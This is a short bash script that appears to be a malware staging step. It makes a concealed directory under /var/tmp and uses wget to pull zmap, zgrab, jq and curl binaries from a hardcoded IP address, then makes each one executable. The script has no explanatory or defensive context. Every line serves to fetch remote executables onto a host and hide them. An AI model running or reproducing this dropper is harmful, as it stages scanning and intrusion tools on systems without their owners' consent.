#!/bin/bash

TMPPATH="/var/tmp/.../...TNT..."
BINHTTP="http://45.9.148.85/chimaera/bin/64bit"
mkdir -p $TMPPATH

wget $BINHTTP/zmap -O $TMPPATH/zmap
chmod +x $TMPPATH/zmap
wget $BINHTTP/zgrab -O $TMPPATH/zgrab
chmod +x $TMPPATH/zgrab
wget $BINHTTP/jq -O $TMPPATH/jq
chmod +x $TMPPATH/jq
wget $BINHTTP/curl -O $TMPPATH/curl
chmod +x $TMPPATH/curl



